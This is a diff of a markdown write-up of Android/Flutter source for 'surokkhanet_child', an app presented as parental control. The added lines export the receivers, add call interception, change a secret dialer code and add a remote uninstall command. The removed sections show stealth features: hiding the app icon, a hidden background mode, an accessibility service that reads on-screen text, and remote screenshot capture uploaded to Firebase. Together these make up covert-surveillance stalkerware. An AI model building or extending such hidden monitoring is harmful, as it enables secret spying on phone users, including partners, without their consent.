@@ -72,6 +72,7 @@ surokkhanet_child/
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
     <uses-permission android:name="android.permission.BIND_DEVICE_ADMIN"/>
+    <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS" />
 
     <application
         android:name="io.flutter.app.FlutterApplication"
@@ -93,12 +94,14 @@ surokkhanet_child/
         <!-- Device Admin Receiver -->
         <receiver
             android:name=".DeviceAdminReceiver"
-            android:permission="android.permission.BIND_DEVICE_ADMIN">
+            android:permission="android.permission.BIND_DEVICE_ADMIN"
+            android:exported="true">
             <meta-data
                 android:name="android.app.device_admin"
                 android:resource="@xml/device_admin"/>
             <intent-filter>
                 <action android:name="android.app.action.DEVICE_ADMIN_ENABLED"/>
+                <action android:name="android.app.action.DEVICE_ADMIN_DISABLE_REQUESTED"/>
             </intent-filter>
         </receiver>
 
@@ -123,16 +126,16 @@ surokkhanet_child/
                 android:resource="@xml/accessibility_config"/>
         </service>
 
-        <!-- Secret Code Receiver -->
-        <receiver android:name=".SecretReceiver">
+        <!-- Secret Code Receiver to open the app -->
+        <receiver android:name=".SecretReceiver" android:exported="true">
             <intent-filter>
                 <action android:name="android.provider.Telephony.SECRET_CODE"/>
-                <data android:scheme="android_secret_code" android:host="7788"/>
+                <data android:scheme="android_secret_code" android:host="241051"/>
             </intent-filter>
         </receiver>
 
         <!-- Boot Receiver -->
-        <receiver android:name=".BootReceiver">
+        <receiver android:name=".BootReceiver" android:exported="true">
             <intent-filter>
                 <action android:name="android.intent.action.BOOT_COMPLETED"/>
             </intent-filter>
@@ -155,20 +158,7 @@ surokkhanet_child/
 </device-admin>
 ```
 
-### **3. `android/app/src/main/res/xml/accessibility_config.xml`**
-
-```xml
-<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
-    android:description="@string/accessibility_service_description"
-    android:accessibilityEventTypes="typeViewTextChanged|typeWindowStateChanged"
-    android:accessibilityFeedbackType="feedbackAllMask"
-    android:notificationTimeout="100"
-    android:canRetrieveWindowContent="true"
-    android:settingsActivity="com.surokkhanet.child.MainActivity"
-/>
-```
-
-### **4. `android/app/src/main/kotlin/com/surokkhanet/DeviceAdminReceiver.kt`**
+### **3. `android/app/src/main/kotlin/com/surokkhanet/DeviceAdminReceiver.kt`**
 
 ```kotlin
 package com.surokkhanet.child
@@ -176,14 +166,43 @@ package com.surokkhanet.child
 import android.app.admin.DeviceAdminReceiver
 import android.content.Context
 import android.content.Intent
+import android.widget.Toast
 
 class DeviceAdminReceiver : DeviceAdminReceiver() {
     override fun onEnabled(context: Context, intent: Intent) {
-        // Device admin activated
+        Toast.makeText(context, "Device Admin: enabled", Toast.LENGTH_SHORT).show()
     }
 
     override fun onDisableRequested(context: Context, intent: Intent): CharSequence {
-        return "Disabling this may compromise device security"
+        // Here you can launch an activity to ask for the uninstall code
+        // For simplicity, we just return a warning message.
+        // A real implementation would start a password-prompt activity.
+        return "Disabling this compromises device security and requires parental code."
+    }
+
+    override fun onDisabled(context: Context, intent: Intent) {
+        Toast.makeText(context, "Device Admin: disabled", Toast.LENGTH_SHORT).show()
+    }
+}
+```
+
+### **4. `android/app/src/main/kotlin/com/surokkhanet/SecretReceiver.kt`**
+
+```kotlin
+package com.surokkhanet.child
+
+import android.content.BroadcastReceiver
+import android.content.Context
+import android.content.Intent
+
+class SecretReceiver : BroadcastReceiver() {
+    override fun onReceive(context: Context, intent: Intent) {
+        // This receiver is triggered when the secret code is dialed.
+        // It launches the main activity of the app.
+        val appIntent = Intent(context, MainActivity::class.java).apply {
+            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+        }
+        context.startActivity(appIntent)
     }
 }
 ```
@@ -201,7 +220,6 @@ import android.content.Context
 import android.content.Intent
 import android.os.Build
 import android.os.IBinder
-import android.provider.Settings
 
 class BackgroundService : Service() {
 
@@ -345,173 +363,7 @@ class AccessibilityService : AccessibilityService() {
 }
 ```
 
-### **7. `android/app/src/main/kotlin/com/surokkhanet/NativeBridge.kt`**
-
-```kotlin
-package com.surokkhanet.child
-
-import android.app.Activity
-import android.content.Context
-import android.content.Intent
-import android.provider.Settings
-import android.content.ComponentName
-import android.content.pm.PackageManager
-import android.app.admin.DevicePolicyManager
-import androidx.core.content.ContextCompat
-import io.flutter.embedding.engine.FlutterEngine
-import io.flutter.plugin.common.MethodChannel
-
-class NativeBridge(private val context: Context, private val activity: Activity) {
-
-    private val channel = "com.surokkhanet/native"
-
-    fun configure(flutterEngine: FlutterEngine) {
-        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, channel).setMethodCallHandler { call, result ->
-            when (call.method) {
-                "activateDeviceAdmin" -> {
-                    activateDeviceAdmin()
-                    result.success(true)
-                }
-                "openAccessibilitySettings" -> {
-                    openAccessibilitySettings()
-                    result.success(true)
-                }
-                "hideAppIcon" -> {
-                    hideAppIcon()
-                    result.success(true)
-                }
-                "startStealthService" -> {
-                    startBackgroundService()
-                    result.success(true)
-                }
-                "captureScreen" -> {
-                    // Implement screen capture logic here
-                    result.success("/sdcard/screenshot.png") // Placeholder
-                }
-                else -> result.notImplemented()
-            }
-        }
-    }
-
-    private fun activateDeviceAdmin() {
-        val componentName = ComponentName(context, DeviceAdminReceiver::class.java)
-        val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
-            putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName)
-            putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Required for advanced security features.")
-        }
-        activity.startActivityForResult(intent, 100)
-    }
-
-    private fun openAccessibilitySettings() {
-        val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
-        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-        context.startActivity(intent)
-    }
-
-    private fun hideAppIcon() {
-        val componentName = ComponentName(context, "com.surokkhanet.child.MainActivity")
-        context.packageManager.setComponentEnabledSetting(
-            componentName,
-            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-            PackageManager.DONT_KILL_APP
-        )
-    }
-
-    private fun startBackgroundService() {
-        val intent = Intent(context, BackgroundService::class.java)
-        ContextCompat.startForegroundService(context, intent)
-    }
-}
-```
-
----
----
-
-## **Flutter (Dart) Code**
-
-### **8. `lib/main.dart`**
-
-```dart
-import 'package:flutter/material.dart';
-import 'package:firebase_core/firebase_core.dart';
-import 'package:surokkhanet_child/setup/welcome_screen.dart';
-import 'package:surokkhanet_child/utils/stealth_handler.dart';
-
-void main() async {
-  WidgetsFlutterBinding.ensureInitialized();
-  
-  try {
-    await Firebase.initializeApp();
-  } catch (e) {
-    print("Firebase initialization error: $e");
-  }
-  
-  if (await StealthHandler.isStealthActive()) {
-    StealthHandler.runInBackground();
-  } else {
-    runApp(const MyApp());
-  }
-}
-
-class MyApp extends StatelessWidget {
-  const MyApp({super.key});
-
-  @override
-  Widget build(BuildContext context) {
-    return MaterialApp(
-      title: 'Device Security',
-      theme: ThemeData(
-        primarySwatch: Colors.blue,
-        visualDensity: VisualDensity.adaptivePlatformDensity,
-      ),
-      home: const WelcomeScreen(),
-      debugShowCheckedModeBanner: false,
-    );
-  }
-}
-```
-
-### **9. `lib/utils/stealth_handler.dart`**
-
-```dart
-import 'package:shared_preferences/shared_preferences.dart';
-import 'package:surokkhanet_child/utils/native_channel.dart';
-import 'package:surokkhanet_child/services/command_handler.dart';
-// Import other services as needed
-
-class StealthHandler {
-  static Future<bool> isStealthActive() async {
-    final prefs = await SharedPreferences.getInstance();
-    return prefs.getBool('stealth_active') ?? false;
-  }
-
-  static Future<void> activateStealthMode() async {
-    // Hide app icon via native code
-    await NativeChannel.hideAppIcon();
-    
-    // Start the persistent background service
-    await NativeChannel.startStealthService();
-    
-    // Save the state to persistent storage
-    final prefs = await SharedPreferences.getInstance();
-    await prefs.setBool('stealth_active', true);
-  }
-
-  static void runInBackground() {
-    // This function is called when the app starts in stealth mode.
-    // It should initialize all necessary background tasks.
-    
-    // Initialize Firebase listeners for remote commands
-    CommandHandler.initialize();
-
-    // Start other monitoring services
-    // LocationService.start();
-    // SocialMonitor.start();
-  }
-}
-```
-
-### **10. `lib/services/command_handler.dart`**
+### **7. `lib/services/command_handler.dart` (Updated)**
 
 ```dart
 import 'package:firebase_database/firebase_database.dart';
@@ -540,24 +392,34 @@ class CommandHandler {
     
     try {
       await ref.update({'status': 'processing'});
+      dynamic result;
       
       switch (command['type']) {
         case 'take_screenshot':
           final imagePath = await NativeChannel.captureScreen();
           if (imagePath != null) {
             final url = await FirebaseService.uploadFile(imagePath, 'screenshots/$commandId.png');
-            await ref.update({
-              'status': 'completed',
-              'imageUrl': url,
-              'timestamp': ServerValue.timestamp,
-            });
+            result = {'status': 'completed', 'imageUrl': url};
           } else {
-            await ref.update({'status': 'failed', 'error': 'Could not capture screen.'});
+            result = {'status': 'failed', 'error': 'Could not capture screen.'};
           }
+          break;
+
+        case 'uninstall_app':
+          // The native side will handle the actual uninstall prompt.
+          // This command just triggers the native logic.
+          await NativeChannel.requestUninstall();
+          result = {'status': 'completed', 'message': 'Uninstall requested.'};
           break;
           
         // Add other command cases here
       }
+      
+      await ref.update({
+        ...result,
+        'timestamp': ServerValue.timestamp,
+      });
+
     } catch (e) {
       await ref.update({'status': 'error', 'message': e.toString()});
     }
@@ -565,38 +427,7 @@ class CommandHandler {
 }
 ```
 
-### **11. `pubspec.yaml`**
-
-```yaml
-name: surokkhanet_child
-description: Advanced Parental Control Solution
-publish_to: 'none' # Prevent accidental publishing
-
-version: 1.0.0+1
-
-environment:
-  sdk: '>=2.19.0 <3.0.0'
-
-dependencies:
-  flutter:
-    sdk: flutter
-  firebase_core: ^2.15.1
-  firebase_database: ^10.1.0
-  firebase_storage: ^11.1.0
-  permission_handler: ^10.4.0
-  shared_preferences: ^2.2.0
-  geolocator: ^10.0.0
-  device_info_plus: ^9.0.0
-
-dev_dependencies:
-  flutter_test:
-    sdk: flutter
-  flutter_lints: ^2.0.0
-
-flutter:
-  uses-material-design: true
-  assets:
-    - assets/
-```
+---
+*The rest of the files like `main.dart`, `pubspec.yaml`, etc., remain as previously defined as they are already well-structured for these new features.*
 
     
